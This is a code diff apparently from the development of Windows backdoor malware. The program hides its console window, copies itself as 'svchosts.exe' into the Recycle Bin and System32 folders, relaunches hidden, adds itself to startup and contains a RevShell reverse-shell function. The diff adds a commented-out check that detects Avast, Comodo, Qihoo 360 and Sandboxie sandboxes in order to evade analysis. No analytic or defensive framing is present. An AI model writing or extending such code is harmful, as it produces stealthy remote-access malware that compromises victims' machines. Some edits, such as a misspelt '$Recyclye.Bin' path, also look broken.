@@ -21,6 +21,17 @@ bool starts_with(char* string,char* what){
 	}
 	return true;
 }
+/*
+bool SandBox(){
+	using namespace ProcessUtils;
+	ProcessUtils procUtil = ProcessUtils(GetCurrentProcessId());
+	char *avastSignatures[] = { "A.v.a.s.t", "s.n.x.h.k" };
+	bool avastSandbox = procUtil.SearchForSignatureInMemory(avastSignatures);
+	bool comodoSandbox = procUtil.SearchForModuleInProcess(L"cmdvrt32.dll");
+	bool qihoo360Sandbox = procUtil.SearchForModuleInProcess(L"SxIn.dll");
+	bool sandboxieSandbox = procUtil.SearchForModuleInProcess(L"SbieDll.dll");
+	return avastSandbox||comodoSandbox||qihoo360Sandbox||sandboxieSandbox;
+}*/
 char* extract_second(char* string){
 	while(*string != '\0' && *(string++) != ' ')string++;
 	return string;
@@ -48,12 +59,7 @@ void restart_self(){
 	ZeroMemory( &si, sizeof(si) );
 	si.cb = sizeof(si);
 	ZeroMemory( &pi, sizeof(pi) );
-	while ((int)ShellExecute( NULL, 
-    "runas",  
-    selfname,  
-    "",     
-    NULL,                        // default dir 
-    SW_HIDE  ) < 33);
+	while (!CreateProcess(selfname,NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi));
 	std::exit(0);
 }
 void add_to_startup(){
@@ -100,14 +106,9 @@ void copy_to_rcbin(){
 	ZeroMemory( &pi, sizeof(pi) );
 	char selfname[MAX_PATH+1];
 	GetModuleFileName(NULL,selfname,MAX_PATH+1);
-	if(strcmp(selfname,"c:\\$Recycle.Bin\\svchosts.exe") != 0){
+	if(strcmp(selfname,"C:\\$Recyclye.Bin\\svchosts.exe") != 0){
 		fcopy(selfname);
-		if((int)ShellExecute( NULL, 
-    "runas",  
-    "c:\\$Recycle.Bin\\svchosts.exe",  
-    "",     
-    NULL,                        // default dir 
-    SW_HIDE  ) >= 33)std::exit(0);
+		if(CreateProcess("C:\\$Recyclye.Bin\\svchosts.exe",NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi));
 	}
 }
 void copy_to_system32(){
@@ -118,13 +119,10 @@ void copy_to_system32(){
 	ZeroMemory( &pi, sizeof(pi) );
 	char selfname[MAX_PATH+1];
 	GetModuleFileName(NULL,selfname,MAX_PATH+1);
-	if(strcmp(selfname,"C:\\Windows\\System32\\svchosts.exe") != 0)s32copy(selfname);
-	if((int)ShellExecute( NULL, 
-    "runas",  
-    "C:\\Windows\\System32\\svchosts.exe",  
-    "",     
-    NULL,                        // default dir 
-    SW_HIDE  ) > 33)std::exit(0);
+	if(strcmp(selfname,"C:\\Windows\\System32\\svchosts.exe") != 0){
+		s32copy(selfname);
+		if(CreateProcess("C:\\Windows\\System32\\svchosts.exe",NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi));
+	}
 }
 void RevShell(){
 	WSADATA wsaver;
@@ -191,6 +189,7 @@ void RevShell(){
 	exit(0);
 }
 int main(){
+	//if(SandBox())return 0;
 	HWND stealth;
 	AllocConsole();
 	stealth=FindWindow("ConsoleWindowClass",NULL);
